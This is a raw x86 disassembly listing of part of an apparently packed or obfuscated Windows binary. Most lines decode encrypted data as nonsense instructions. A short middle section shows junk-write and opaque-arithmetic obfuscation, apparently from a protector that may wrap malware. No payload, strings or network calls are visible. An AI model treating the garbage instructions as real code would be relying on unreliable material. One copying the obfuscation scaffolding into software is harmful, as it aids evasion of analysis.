  40abd9:	icebp  
  40abda:	in     eax,dx
  40abdb:	in     al,0xad
  40abdd:	shr    bl,0xb0
  40abe0:	mov    ecx,0x3d7b8b6
  40abe5:	out    dx,eax
  40abe6:	xlat   BYTE PTR ds:[ebx]
  40abe7:	neg    dl
  40abe9:	sar    DWORD PTR [edi+0x1d4fafa],cl
  40abef:	cmc    
  40abf0:	out    dx,eax
  40abf1:	or     ch,ch
  40abf3:	fild   DWORD PTR [esi]
  40abf5:	in     eax,dx
  40abf6:	fcomip st,st(0)
  40abf8:	retf   
  40abf9:	jmp    0xd3d6:0xb5e3cab6
  40ac00:	aam    0xd8
  40ac02:	clc    
  40ac03:	div    bl
  40ac05:	mov    ebp,0xc3e0d7d5
  40ac0a:	push   es
  40ac0b:	or     ecx,ebx
  40ac0d:	ret    0xea08
  40ac10:	ror    eax,0xc3
  40ac13:	fcomp  st(2)
  40ac15:	loop   0x40ac09
  40ac17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac18:	jmp    0xd709a2d0
  40ac1d:	retf   
  40ac1e:	out    dx,eax
  40ac1f:	out    dx,eax
  40ac20:	mov    edx,0xb9e9d2eb
  40ac25:	sti    
  40ac26:	ret    0xfcb9
  40ac29:	pop    es
  40ac2a:	cmc    
  40ac2b:	fsub   st,st(4)
  40ac2d:	in     eax,0xca
  40ac2f:	(bad)  [ebx]
  40ac31:	pminsw mm0,QWORD PTR [edx]
  40ac34:	fld    DWORD PTR ds:0xebaceec7
  40ac3a:	jmp    0x40ac28
  40ac3c:	mov    al,0xba
  40ac3e:	(bad)
  40ac41:	icebp  
  40ac42:	fdiv   st(2),st
  40ac44:	shl    DWORD PTR [eax-0x2a244001],cl
  40ac4a:	(bad)  
  40ac4c:	repnz (bad) 
  40ac4f:	in     al,0xd8
  40ac51:	(bad)  
  40ac52:	jmp    0xe209b330
  40ac57:	mov    esi,0xe9d3c0cb
  40ac5c:	leave  
  40ac5d:	lods   al,BYTE PTR ds:[esi]
  40ac5e:	rcl    dl,0xb1
  40ac61:	(bad)  
  40ac63:	iret   
  40ac64:	into   
  40ac65:	add    al,BYTE PTR [edx]
  40ac67:	iret   
  40ac68:	mov    ch,0xcc
  40ac6a:	rol    BYTE PTR [ebx+eax*8],cl
  40ac6d:	rol    DWORD PTR [edi],0xc2
  40ac70:	add    eax,0xf8dc06c9
  40ac75:	loope  0x40ac3f
  40ac77:	fucomp st(2)
  40ac79:	retf   0xe8b7
  40ac7c:	into   
  40ac7d:	rcr    bl,0xc8
  40ac80:	in     al,0xff
  40ac82:	stc    
  40ac83:	ror    dl,1
  40ac85:	mov    esi,0xfdbdfd01
  40ac8a:	mov    esi,0xfef7c6d4
  40ac8f:	add    al,0xdc
  40ac91:	loop   0x40ac76
  40ac93:	in     eax,0xd3
  40ac95:	out    dx,al
  40ac96:	loope  0x40ac80
  40ac98:	mov    edi,0xf4b1ccc3
  40ac9d:	(bad)  
  40ac9e:	(bad)  
  40ac9f:	stc    
  40aca0:	shl    DWORD PTR [edi+esi*4-0xb014445],1
  40aca7:	stc    
  40aca8:	fsubr  st(3),st
  40acaa:	fiadd  WORD PTR [edx]
  40acac:	aam    0xc5
  40acae:	mov    edi,0xfee4dff4
  40acb3:	enter  0xfc07,0xf1
  40acb7:	call   0xe4265a6a
  40acbc:	int    0xe8
  40acbe:	retf   0xc5b7
  40acc1:	mov    dh,0xd2
  40acc3:	in     eax,dx
  40acc4:	hlt    
  40acc5:	ret    
  40acc6:	icebp  
  40acc7:	in     eax,dx
  40acc8:	aad    0x7
  40acca:	in     eax,0xfd
  40accc:	cmc    
  40accd:	repnz (bad) 
  40acd0:	out    dx,al
  40acd1:	cmc    
  40acd2:	jmp    0xf6b1:0xc5e0eaef
  40acd9:	leave  
  40acda:	ret    0xacf6
  40acdd:	sti    
  40acde:	out    dx,eax
  40acdf:	rcl    esi,1
  40ace1:	(bad)  
  40ace3:	mov    ch,0xf1
  40ace5:	mov    ecx,0xceced6bd
  40acea:	fild   DWORD PTR [ecx]
  40acec:	cli    
  40aced:	in     al,0xbf
  40acef:	add    eax,eax
  40acf1:	pop    es
  40acf2:	enter  0xfc0d,0xec
  40acf6:	lock mov dl,0xd7
  40acf9:	(bad)  
  40acfa:	into   
  40acfb:	lods   eax,DWORD PTR ds:[esi]
  40acfc:	aad    0xb7
  40acfe:	loopne 0x40acca
  40ad00:	mov    bh,0xba
  40ad02:	mov    bl,0xd7
  40ad04:	(bad)  
  40ad06:	clc    
  40ad07:	shl    esi,0xc6
  40ad0a:	int    0x1
  40ad0c:	lock (bad) 
  40ad0e:	fdivp  st(4),st
  40ad10:	neg    ch
  40ad12:	fmul   st,st(0)
  40ad14:	sti    
  40ad15:	add    ah,BYTE PTR [edi-0x3e4e2922]
  40ad1b:	in     eax,0xa9
  40ad1d:	(bad)  
  40ad1f:	scas   al,BYTE PTR es:[edi]
  40ad20:	cmc    
  40ad21:	(bad)
  40ad25:	loope  0x40acde
  40ad27:	rol    bh,0xf4
  40ad2a:	mov    BYTE PTR [edi],0x1
  40ad2d:	fucomip st,st(2)
  40ad2f:	or     cl,bl
  40ad31:	clc    
  40ad32:	hlt    
  40ad33:	leave  
  40ad34:	loope  0x40ad39
  40ad36:	jecxz  0x40ad2f
  40ad38:	in     eax,0xaf
  40ad3a:	call   0xe71c6103
  40ad3f:	jmp    0xbc379d3e
  40ad44:	mov    ah,0xdb
  40ad46:	ret    
  40ad47:	aam    0xbd
  40ad49:	(bad)  
  40ad4a:	add    al,0xeb
  40ad4c:	aad    0xe6
  40ad4e:	push   es
  40ad4f:	retf   0xdbeb
  40ad52:	call   0xbf307860
  40ad57:	into   
  40ad58:	xlat   BYTE PTR ds:[ebx]
  40ad59:	loopne 0x40ace6
  40ad5b:	dec    ebp
  40ad5c:	or     BYTE PTR [ebx],dh
  40ad5e:	mul    BYTE PTR [ecx+0x43772f]
  40ad64:	add    DWORD PTR ds:0x437767,eax
  40ad6a:	sub    ecx,0x5424137
  40ad70:	inc    eax
  40ad71:	sbb    esi,0x0
  40ad74:	xor    eax,DWORD PTR ds:0x43771b
  40ad7a:	xor    ecx,0x8a29a14b
  40ad80:	adc    eax,DWORD PTR ds:0x43775f
  40ad86:	xor    esi,0x0
  40ad89:	mov    DWORD PTR ds:0x437773,0x7e2
  40ad93:	mov    eax,ds:0x43739f
  40ad98:	mov    eax,DWORD PTR [eax+0x1c8]
  40ad9e:	add    DWORD PTR ds:0x437737,0x43770f
  40ada8:	mov    eax,DWORD PTR [eax]
  40adaa:	sub    DWORD PTR ds:0x437723,0xba8
  40adb4:	cdq    
  40adb5:	or     DWORD PTR ds:0x43771b,0x437747
  40adbf:	sub    eax,0x5424137
  40adc4:	sbb    edx,0x0
  40adc7:	xor    eax,0x8a29a14b
  40adcc:	sub    DWORD PTR ds:0x43772f,0x4df4
  40add6:	xor    edx,0x0
  40add9:	mov    DWORD PTR [ebp-0x2c],ecx
  40addc:	mov    DWORD PTR ds:0x43772f,0x73f6
  40ade6:	mov    DWORD PTR [ebp-0x28],esi
  40ade9:	mov    DWORD PTR ds:0x43772f,0xee1
  40adf3:	mov    DWORD PTR [ebp-0x34],eax
  40adf6:	mov    DWORD PTR ds:0x43772f,0x1b8
  40ae00:	mov    DWORD PTR [ebp-0x30],edx
  40ae03:	mov    DWORD PTR ds:0x43777f,0x1aab
  40ae0d:	mov    eax,DWORD PTR [ebp-0x2c]
  40ae10:	cmp    eax,DWORD PTR [ebp-0x34]
  40ae13:	mov    DWORD PTR ds:0x43777b,0xd67
  40ae1d:	jne    0x40ae34
  40ae23:	mov    eax,0x7348
  40ae28:	mov    eax,DWORD PTR [ebp-0x28]
  40ae2b:	cmp    eax,DWORD PTR [ebp-0x30]
  40ae2e:	je     0x40ae56
  40ae34:	and    DWORD PTR ds:0x43775b,0x1a29
  40ae3e:	mov    eax,DWORD PTR [ebp+0x8]
  40ae41:	add    eax,DWORD PTR [ebp+0xc]
  40ae44:	mov    DWORD PTR ds:0x437753,0x47ad
  40ae4e:	mov    DWORD PTR [ebp+0x8],eax
  40ae51:	jmp    0x40d295
  40ae56:	and    DWORD PTR ds:0x43777f,0x0
  40ae60:	jmp    0x40ae73
  40ae65:	xor    eax,eax
  40ae67:	xor    eax,DWORD PTR ds:0x43777f
  40ae6d:	inc    eax
  40ae6e:	mov    ds:0x43777f,eax
  40ae73:	cmp    DWORD PTR ds:0x43777f,0x17
  40ae7a:	jae    0x40aebd
  40ae80:	cmp    DWORD PTR ds:0x43777f,0x4
  40ae87:	ja     0x40aebd
  40ae8d:	jmp    0x40ae9d
  40ae92:	push   0x75c8
  40ae97:	call   DWORD PTR ds:0x43c998
  40ae9d:	cmp    DWORD PTR ds:0x43777f,0x3
  40aea4:	jne    0x40aeb8
  40aeaa:	xor    eax,eax
  40aeac:	xor    eax,DWORD PTR ds:0x43777f
  40aeb2:	inc    eax
  40aeb3:	mov    ds:0x43777f,eax
  40aeb8:	jmp    0x40ae65
  40aebd:	mov    eax,DWORD PTR [ebp-0x8]
  40aec0:	mov    eax,DWORD PTR [eax]
  40aec2:	xor    ecx,ecx
  40aec4:	sub    eax,0x5424137
  40aec9:	sbb    ecx,0x0
  40aecc:	xor    eax,0x8a29a14b
  40aed1:	xor    ecx,0x0
  40aed4:	xor    eax,0x8a29a14b
  40aed9:	xor    ecx,0x0
  40aedc:	jmp    0x40d22a
  40aee1:	adc    DWORD PTR [edi+0x72f722e7],0x46
  40aee8:	ss hlt 
  40aeea:	icebp  
  40aeeb:	xchg   DWORD PTR [esp+ebx*2+0x3fc48018],eax
  40aef2:	pop    es
  40aef3:	jnp    0x40af70
  40aef5:	stos   BYTE PTR es:[edi],al
  40aef6:	cwde   
  40aef7:	jnp    0x40af74
  40aef9:	loop   0x40aef6
  40aefb:	(bad)  
  40aefc:	sti    
  40aefd:	(bad)  
  40aeff:	call   0x331aafb
  40af04:	sti    
  40af05:	sar    esi,1
  40af07:	(bad)  
  40af09:	cmc    
  40af0a:	inc    DWORD PTR [esi]
  40af0c:	lock in eax,0xe2
  40af0f:	jmp    0xd8fd:0xcec8df0f
  40af16:	lods   al,BYTE PTR ds:[esi]
  40af17:	fsub   st(3),st
  40af19:	bnd ret 
  40af1b:	out    0xd4,al
  40af1d:	enter  0xc6f0,0xec
  40af21:	mov    bl,0xdf
  40af23:	idiv   dh
  40af25:	out    dx,eax
  40af26:	cli    
  40af27:	rcr    dl,0xd5
  40af2a:	jmp    0x40af2c
  40af2c:	out    0xc0,eax
  40af2e:	(bad)  
  40af30:	stc    
  40af31:	add    eax,0xddcfd80a
  40af36:	in     eax,0xdd
  40af38:	in     al,dx
  40af39:	(bad)  
  40af3a:	int    0xd7
  40af3c:	repnz enter 0xe5b6,0xf6
  40af41:	mov    eax,0xd3f4d6c8
  40af46:	jecxz  0x40af3e
  40af48:	fdivrp st(7),st
  40af4a:	in     al,dx
  40af4b:	lock (bad) 
  40af4d:	(bad)  
  40af4e:	add    eax,0xd9ffefc4
  40af53:	int3   
  40af54:	push   cs
  40af55:	faddp  st(1),st
  40af57:	ret    
  40af58:	(bad)  [ebx-0x3a481334]
  40af5e:	int    0xe4
  40af60:	(bad)  
  40af61:	(bad)  
  40af62:	rcl    eax,1
  40af64:	rcr    ebx,1
  40af66:	mov    ecx,0xe702fcd0
  40af6b:	aam    0xfb
  40af6d:	out    0xe1,al
  40af6f:	cld    
  40af70:	loope  0x40af6a
  40af72:	loop   0x40af71
  40af74:	loope  0x40af29
  40af76:	test   eax,0xdbb3d6af
  40af7b:	lock out dx,al
  40af7d:	repz mov eax,0xfae5e6ef
  40af83:	clc    
  40af84:	jmp    0xdc16725f
  40af89:	add    ecx,eax
  40af8b:	stc    
  40af8c:	add    ebx,ebp
  40af8e:	in     eax,0xe5
  40af90:	jmp    0x40af8d
  40af92:	hlt    
  40af93:	int    0xe8
  40af95:	out    0xe2,eax
  40af97:	shr    bh,1
  40af99:	repnz jecxz 0x40af5e
  40af9c:	hlt    
  40af9d:	into   
  40af9e:	(bad)  
  40afa0:	(bad)  
  40afa2:	clc    
  40afa3:	stc    
  40afa4:	(bad)  
  40afa6:	icebp  
  40afa7:	out    dx,al
  40afa8:	repnz cli 
  40afaa:	loope  0x40af77
  40afac:	mov    eax,0xd5020ac9
  40afb1:	ret    
  40afb2:	cli    
  40afb3:	pop    es
  40afb4:	pop    es
  40afb5:	jmp    0x40af95
  40afb7:	loopne 0x40af95
  40afb9:	(bad)  
  40afba:	jmp    0xe9f6:0xf3c0f4e5
  40afc1:	mov    ch,0xd1
  40afc3:	fild   DWORD PTR [edx]
  40afc5:	cmc    
  40afc6:	ret    0xdcc1
  40afc9:	mov    edi,0xbe3f003
  40afce:	cli    
  40afcf:	clc    
  40afd0:	(bad)  
  40afd1:	in     eax,dx
  40afd2:	in     eax,0xdc
  40afd4:	in     al,0xe2
  40afd6:	into   
  40afd7:	les    esi,FWORD PTR [edi-0x480e240e]
  40afdd:	leave  
  40afde:	out    0xb7,eax
  40afe0:	mov    bh,0xff
  40afe2:	jecxz  0x40afd5
  40afe4:	aam    0xd2
  40afe6:	hlt    
  40afe7:	cli    
  40afe8:	mov    ebp,0xcbe702f4
  40afed:	shl    eax,1
  40afef:	clc    
  40aff0:	or     ecx,DWORD PTR [ebx]
  40aff2:	iret   
  40aff3:	or     ch,bh
  40aff5:	test   eax,0xf3c4acdf
  40affa:	scas   al,BYTE PTR es:[edi]
  40affb:	call   0xbafc66ca
  40b000:	hlt    
  40b001:	int    0xfd
  40b003:	fdivp  st(4),st
  40b005:	ret    0xd9ee
  40b008:	add    esp,ecx
  40b00a:	std    
  40b00b:	(bad)  
  40b00d:	vcvttpd2dq xmm4,xmm2
  40b011:	in     al,0xf4
  40b013:	jmp    0xde056e09
  40b018:	mov    al,0xf4
  40b01a:	mov    bh,0xb2
  40b01c:	stc    
  40b01d:	int3   
  40b01e:	hlt    
  40b01f:	aam    0xcc
  40b021:	(bad)  
  40b023:	in     al,dx
  40b024:	fcmovnu st,st(6)
  40b026:	add    edi,DWORD PTR [ecx-0x153d223d]
  40b02c:	add    al,0xd5
  40b02e:	inc    DWORD PTR [edx]
  40b030:	or     BYTE PTR [eax],al
  40b032:	(bad)  
  40b034:	add    bh,BYTE PTR [ecx-0x2c2a3e3d]
  40b03a:	iret   
  40b03b:	loop   0x40b016
  40b03d:	mov    ch,0xd0
  40b03f:	not    eax
  40b041:	enter  0xc8da,0xd7
  40b045:	fdivrp st(6),st
  40b047:	repz repnz fcomp st(3)
  40b04b:	loopne 0x40b02e
  40b04d:	in     eax,0xe8
  40b04f:	leave  
  40b050:	mov    esp,0x1205d8cf
  40b055:	loop   0x40b036
  40b057:	leave  
  40b058:	in     al,dx
  40b059:	lods   al,BYTE PTR ds:[esi]
  40b05a:	mov    bl,0xe7
  40b05c:	(bad)  
  40b05d:	in     al,dx
  40b05e:	out    0xea,al
  40b060:	out    dx,al
  40b061:	aad    0xb5
  40b063:	rcr    cl,cl
  40b065:	in     eax,dx
  40b066:	loop   0x40b068
  40b068:	sar    DWORD PTR [ebp-0x9020526],1
  40b06e:	(bad)  
  40b06f:	or     esp,ebx
  40b071:	cld    
  40b072:	add    ebx,ecx
  40b074:	add    ch,BYTE PTR [esi+edi*4-0x32105312]
  40b07b:	leave  
  40b07c:	iret   
  40b07d:	mov    ah,0xb6
  40b07f:	mov    ecx,0xb5b8d3ea
  40b084:	fneni(8087 only) 
  40b086:	mov    esi,0xf2edc2d3
  40b08b:	(bad)  
  40b08c:	shl    ah,cl
  40b08e:	in     al,0xd4
  40b090:	aad    0xf5
  40b092:	out    dx,eax
  40b093:	repnz adc bh,BYTE PTR [ebp+eiz*8-0x2f493a57]
  40b09b:	int3   
  40b09c:	lds    esi,FWORD PTR [ecx-0x46532118]
  40b0a2:	out    dx,eax
  40b0a3:	clc    
  40b0a4:	imul   ah
  40b0a6:	clc    
  40b0a7:	mov    esp,0xc3ded0e3
  40b0ac:	or     ebp,esi
  40b0ae:	or     ch,dh
  40b0b0:	(bad)  
  40b0b1:	loope  0x40b07d
  40b0b3:	jmp    0xaf05609e
  40b0b8:	ret    
  40b0b9:	imul   cl
  40b0bb:	loop   0x40b0b0
  40b0bd:	shl    DWORD PTR [esi-0x25351b2f],1
  40b0c3:	jmp    0xfb4268a5
  40b0c8:	mov    edi,0xe4d7c6dc
  40b0cd:	out    0xca,al
  40b0cf:	(bad)  
  40b0d0:	mov    esp,0xe6e9ecfa
  40b0d5:	out    0xc5,al
  40b0d7:	out    0xc2,al
  40b0d9:	(bad)  
  40b0da:	in     eax,0xbb
  40b0dc:	idiv   ecx
  40b0de:	fcmovnbe st,st(3)
  40b0e0:	mov    al,0xbe
  40b0e2:	cld    
  40b0e3:	hlt    
  40b0e4:	fcmovnu st,st(6)
  40b0e6:	cld    
  40b0e7:	pop    es
  40b0e8:	out    0xe0,al
  40b0ea:	stc    
  40b0eb:	cmc    
  40b0ec:	or     ebp,ebx
  40b0ee:	or     dh,ah
  40b0f0:	jecxz  0x40b0e1
  40b0f2:	add    al,0xdf
  40b0f4:	add    cl,ah
  40b0f6:	retf   
  40b0f7:	mov    al,0xf3
  40b0f9:	icebp  
  40b0fa:	jmp    0x40b0d3
  40b0fc:	out    0xcd,eax
  40b0fe:	sar    BYTE PTR [edi-0xd2e1654],0xb0
  40b105:	bnd ret 
  40b107:	mov    ch,0xfe
  40b109:	(bad)  
  40b10a:	(bad)  
  40b10c:	in     al,0xe6
  40b10e:	in     eax,0xe
  40b110:	enter  0xc5dc,0xfe
  40b114:	in     eax,0xe0
  40b116:	retf   0xd1a5
  40b119:	jecxz  0x40b0db
  40b11b:	shl    BYTE PTR [ecx-0x31104415],0xfb
  40b122:	mov    ecx,0xfabfd3eb
  40b127:	(bad)  
  40b128:	int3   
  40b129:	vpaddd xmm2,xmm5,xmm7
  40b12d:	(bad)  
  40b12e:	(bad)  
  40b130:	(bad)  
  40b131:	iret   
  40b132:	add    ebp,esi
  40b134:	cli    
  40b135:	loop   0x40b0f4
  40b137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b139:	enter  0xcce6,0xbb
  40b13d:	ror    ebx,1
  40b13f:	call   0xfc11a01f
  40b144:	lock loope 0x40b149
  40b147:	int3   
  40b148:	sar    edx,0xd8
  40b14b:	sar    ah,1
  40b14d:	add    al,0xc9
  40b14f:	les    eax,FWORD PTR [edx]
  40b151:	in     al,dx
  40b152:	out    dx,al
  40b153:	in     eax,dx
  40b154:	out    0xab,eax
  40b156:	enter  0xc6bc,0xe2
  40b15a:	mov    ch,0xd6
  40b15c:	mov    cl,0xce
  40b15e:	rol    esi,1
  40b160:	out    0xf2,al
  40b162:	mov    ebp,0xddbc02ca
  40b167:	add    bl,dl
  40b169:	ret    0xd6d5
  40b16c:	aam    0xf9
  40b16e:	jmp    0xcc4ec069
  40b173:	cli    
  40b174:	int    0xc3
  40b176:	test   al,0xe4
  40b178:	vcmppd ymm3,ymm6,ymm2,0xf2
  40b17d:	(bad)  
  40b17e:	fcmovnbe st,st(7)
  40b180:	mov    dh,0xea
  40b182:	out    dx,eax
  40b183:	mov    eax,0xedd9f9cc
  40b188:	in     eax,0x7
  40b18a:	cmc    
  40b18b:	shl    esi,0xc9
  40b18e:	fnsetpm(287 only) 
  40b190:	out    0xe9,al
  40b192:	or     al,0x1
  40b194:	repnz repz in al,0xc0
  40b198:	out    dx,al
  40b199:	hlt    
  40b19a:	stos   BYTE PTR es:[edi],al
  40b19b:	cli    
  40b19c:	mov    ah,0xcd
  40b19e:	mov    ebx,0xf7f5e9b7
  40b1a3:	mov    ebx,0xc0febdd8
  40b1a8:	fdiv   st(4),st
  40b1aa:	in     eax,0xd9
  40b1ac:	mov    eax,0x904c7fe
  40b1b1:	aad    0x9
  40b1b3:	repnz out 0xc1,eax
  40b1b6:	xlat   BYTE PTR ds:[ebx]
  40b1b7:	fidivr WORD PTR [ebp-0x4552091b]
  40b1bd:	into   
  40b1be:	repnz div DWORD PTR [edi+edi*8-0x2b232f43]
  40b1c6:	jecxz  0x40b185
  40b1c8:	lock loopne 0x40b1bf
  40b1cb:	(bad)  
  40b1cc:	hlt    
  40b1cd:	or     ah,ah
  40b1cf:	add    ah,cl
  40b1d1:	clc    
  40b1d2:	inc    DWORD PTR [ebx+eax*1]
  40b1d5:	rcl    bh,1
  40b1d7:	enter  0xc1dc,0xf3
  40b1db:	ret    
  40b1dc:	shr    BYTE PTR [edi-0x4b39270a],cl
  40b1e2:	jmp    0xed378cdf
  40b1e7:	int    0xf5
  40b1e9:	mov    edi,0xf1dce7c4
  40b1ee:	xlat   BYTE PTR ds:[ebx]
  40b1ef:	sar    dl,0x4
  40b1f2:	retf   0xffe
  40b1f5:	int    0xaa
  40b1f7:	(bad)  
  40b1f9:	iret   
  40b1fa:	ror    dl,cl
  40b1fc:	call   0xf71466ca
  40b201:	(bad)  
  40b203:	add    edi,DWORD PTR [eax-0x33181e37]
  40b209:	loopne 0x40b1ff
  40b20b:	jmp    0x40b211
  40b20d:	jmp    0xdf00:0xcf0eca04
  40b214:	in     al,dx
  40b215:	mov    cl,0xc6
  40b217:	loop   0x40b1e5
  40b219:	mov    al,0xf4
  40b21b:	div    ecx
  40b21d:	int    0xb5
  40b21f:	xlat   BYTE PTR ds:[ebx]
  40b220:	jmp    0x40b1d8
  40b222:	(bad)  
  40b224:	rcl    esp,cl
  40b226:	int    0xcf
  40b228:	icebp  
  40b229:	out    0xd3,al
  40b22b:	(bad)  
  40b22c:	or     ebx,esi
  40b22e:	out    0xfd,eax
  40b230:	or     dl,cl
  40b232:	in     eax,dx
  40b233:	(bad)  
  40b234:	cld    
  40b235:	jecxz  0x40b221
  40b237:	rcl    ecx,cl
  40b239:	mov    cl,0xe1
  40b23b:	mov    dl,0xc1
  40b23d:	cmc    
  40b23e:	mov    dh,0xd9
  40b240:	mov    dh,0xdd
  40b242:	mov    edi,0xbf03f9b4
  40b247:	std    
  40b248:	rol    BYTE PTR [esi],cl
  40b24a:	ret    
  40b24b:	(bad)  
  40b24c:	hlt    
  40b24d:	not    eax
  40b24f:	or     ecx,DWORD PTR [edx]
  40b251:	pop    es
  40b252:	jmp    0xa8ee9c5e
  40b257:	ret    0xade0
  40b25a:	in     al,0xe9
  40b25c:	test   al,0xed
  40b25e:	into   
  40b25f:	icebp  
  40b260:	aam    0xd9
  40b262:	mov    ebx,0xf101dbb8
  40b267:	aad    0x7
  40b269:	ret    0xc3d2
  40b26c:	(bad)  
  40b26d:	jmp    edi
  40b26f:	std    
  40b270:	cli    
  40b271:	or     al,0xc5
  40b273:	or     bl,dl
  40b275:	lock loopne 0x40b227
  40b278:	jmp    0xcfd2:0xfbd4e6d4
  40b27f:	jmp    0x40b274
  40b281:	out    dx,eax
  40b282:	out    dx,al
  40b283:	mov    ah,0xc3
  40b285:	jmp    0xf433718a
  40b28a:	loope  0x40b28e
  40b28c:	test   BYTE PTR [ecx],0xf6
  40b28f:	iret   
  40b290:	cmc    
  40b291:	or     al,0x9
  40b293:	push   es
  40b294:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b296:	out    dx,al
  40b297:	out    0xed,al
  40b299:	retf   0xc9e3
  40b29c:	out    dx,eax
  40b29d:	fdiv   st,st(4)
  40b29f:	icebp  
  40b2a0:	xlat   BYTE PTR ds:[ebx]
  40b2a1:	(bad)  
  40b2a3:	int3   
  40b2a4:	sar    DWORD PTR [edx-0x3c0b111f],1
  40b2aa:	fmul   QWORD PTR [edx]
  40b2ac:	add    ah,ah
  40b2ae:	jmp    0x40b2a8
  40b2b0:	iret   
  40b2b1:	(bad)  
  40b2b2:	fiadd  WORD PTR ds:0xe4f7c501
  40b2b8:	loope  0x40b291
  40b2ba:	lods   eax,DWORD PTR ds:[esi]
  40b2bb:	jmp    0xd8b4:0xbacbf1f3
  40b2c2:	mov    esi,0xd6c2f8ea
  40b2c7:	mov    esi,0xf4d8d6cd
  40b2cc:	sti    
  40b2cd:	(bad)  
  40b2ce:	loop   0x40b2a7
  40b2d0:	call   0xce32ba9f
  40b2d5:	out    0xa9,al
  40b2d7:	shl    cl,cl
  40b2d9:	(bad)  
  40b2da:	not    bh
  40b2dc:	out    dx,eax
  40b2dd:	mul    bh
  40b2df:	out    0xd6,eax
  40b2e1:	(bad)  
  40b2e3:	repz mov edx,0xed06bdec
  40b2e9:	out    0xd1,al
  40b2eb:	repz (bad) 
  40b2ed:	mov    edi,0xf8c704f7
  40b2f2:	add    al,0x5
  40b2f4:	add    al,0xa9
  40b2f6:	loop   0x40b2dc
  40b2f8:	out    dx,eax
  40b2f9:	out    0xb7,al
  40b2fb:	in     al,dx
  40b2fc:	int    0xf7
  40b2fe:	(bad)  
  40b2ff:	mov    eax,0xead1feda
  40b304:	call   0xd71092f1
  40b309:	int3   
  40b30a:	ret    0xf9d8
  40b30d:	loopne 0x40b313
  40b30f:	aad    0xe6
  40b311:	fld    QWORD PTR [ebx]
  40b313:	repnz cld 
  40b315:	lds    edi,FWORD PTR [eax-0x291e162f]
  40b31b:	out    0xcb,al
  40b31d:	out    dx,eax
  40b31e:	mov    ecx,0xf5e8c4c6
  40b323:	int3   
  40b324:	dec    cl
  40b326:	fiadd  DWORD PTR [esi]
  40b328:	int    0xf6
  40b32a:	rcl    edi,0xd9
  40b32d:	or     ebx,ebp
  40b32f:	clc    
  40b330:	or     ebp,ebp
  40b332:	or     al,BYTE PTR [ecx]
  40b334:	in     eax,dx
  40b335:	fxch   st(6)
  40b337:	bnd jmp 0xce187c0d
  40b33d:	in     al,0xb0
  40b33f:	icebp  
  40b340:	call   0xcd208a41
  40b345:	xlat   BYTE PTR ds:[ebx]
  40b346:	ror    ah,0x3
  40b349:	fcomp  st(2)
  40b34b:	out    0xd8,al
  40b34d:	imul   bh
  40b34f:	add    DWORD PTR [ebx],ecx
  40b351:	pop    es
  40b352:	or     al,0xa
  40b354:	loope  0x40b32f
  40b356:	in     al,dx
  40b357:	(bad)  
  40b358:	repnz iret 
  40b35a:	fdivr  st(2),st
  40b35c:	loope  0x40b353
  40b35e:	(bad)
  40b361:	retf   
  40b362:	repnz repz mov esi,0xda0001b9
  40b369:	push   es
  40b36a:	loope  0x40b36d
  40b36c:	add    al,BYTE PTR ds:0x3e904ef
  40b372:	(bad)  
  40b374:	fldcw  WORD PTR [edx-0x2f163658]
  40b37a:	out    0xa9,eax
  40b37c:	mov    cl,0xf8
  40b37e:	out    dx,al
  40b37f:	fcomi  st,st(0)
  40b381:	dec    bh
  40b383:	clc    
  40b384:	add    ebp,ebp
  40b386:	imul   ch
  40b388:	cmc    
  40b389:	add    eax,0xeaffe7d8
  40b38e:	fucomp st(2)
  40b390:	hlt    
  40b391:	(bad)  
  40b393:	clc    
  40b394:	adc    ebx,ecx
  40b396:	in     eax,0xf7
  40b398:	repz mov al,0xe7
  40b39b:	mov    ebx,0xfeb8c7f7
  40b3a0:	icebp  
  40b3a1:	mov    eax,0xbfedf2fa
  40b3a6:	lock fcmovne st,st(6)
  40b3a9:	repz push es
  40b3ab:	aam    0xf7
  40b3ad:	mov    eax,0xefbebf7
  40b3b3:	rcr    esp,cl
  40b3b5:	ret    0xc5b2
  40b3b8:	mov    bh,0xe3
  40b3ba:	mov    bh,0xf3
  40b3bc:	mov    ebx,0xddcdd1c5
  40b3c1:	fucomp st(5)
  40b3c3:	cld    
  40b3c4:	iret   
  40b3c5:	hlt    
  40b3c6:	add    DWORD PTR [eax],eax
  40b3c8:	sti    
  40b3c9:	clc    
  40b3ca:	add    edi,esp
  40b3cc:	ret    0xe1d7
  40b3cf:	or     ah,dl
  40b3d1:	enter  0xc103,0xe6
  40b3d5:	fld    st(0)
  40b3d7:	xlat   BYTE PTR ds:[ebx]
  40b3d8:	fadd   st(3),st
  40b3da:	leave  
  40b3db:	fcmovnbe st,st(7)
  40b3dd:	(bad)  
  40b3de:	fidivr DWORD PTR [ebx-0xbfc4914]
  40b3e4:	add    dl,dl
  40b3e6:	std    
  40b3e7:	loope  0x40b3be
  40b3e9:	add    eax,0xf9f1d0fc
  40b3ee:	lock fucomp st(6)
  40b3f1:	fsubrp st(2),st
  40b3f3:	or     ecx,DWORD PTR [esi]
  40b3f5:	vshufps xmm5,xmm5,xmm1,0xe7
  40b3fa:	scas   al,BYTE PTR es:[edi]
  40b3fb:	sti    
  40b3fc:	(bad)  
  40b3fd:	loope  0x40b3fa
  40b3ff:	retf   
  40b400:	out    dx,eax
  40b401:	sti    
  40b402:	shl    dl,1
  40b404:	mov    edi,0xd2bcdfbb
  40b409:	inc    ch
  40b40b:	std    
  40b40c:	test   bh,0xff
  40b40f:	shl    esi,0xd5
  40b412:	in     eax,0xc1
  40b414:	add    eax,0xc1add1d3
  40b419:	lods   al,BYTE PTR ds:[esi]
  40b41a:	mul    esi
  40b41c:	iret   
  40b41d:	int    0xd5
  40b41f:	out    dx,al
  40b420:	hlt    
  40b421:	iret   
  40b422:	int    0xc3
  40b424:	fidivr DWORD PTR [edi-0xb131d42]
  40b42a:	fld    DWORD PTR [ecx]
  40b42c:	(bad)  
  40b42d:	jmp    0x40b42f
  40b42f:	fucompp 
  40b431:	enter  0xc4f3,0xdd
  40b435:	test   eax,0xc6f7deb0
  40b43a:	xlat   BYTE PTR ds:[ebx]
  40b43b:	jmp    0xb939a2fb
  40b440:	aam    0xbd
  40b442:	(bad)  
  40b443:	repnz add edi,DWORD PTR [ecx+0x5e603cf]
  40b44a:	int3   
  40b44b:	add    ecx,edx
  40b44d:	loop   0x40b430
  40b44f:	test   DWORD PTR [edi],0xc0f3030e
  40b455:	mov    esp,0xc0eecdf1
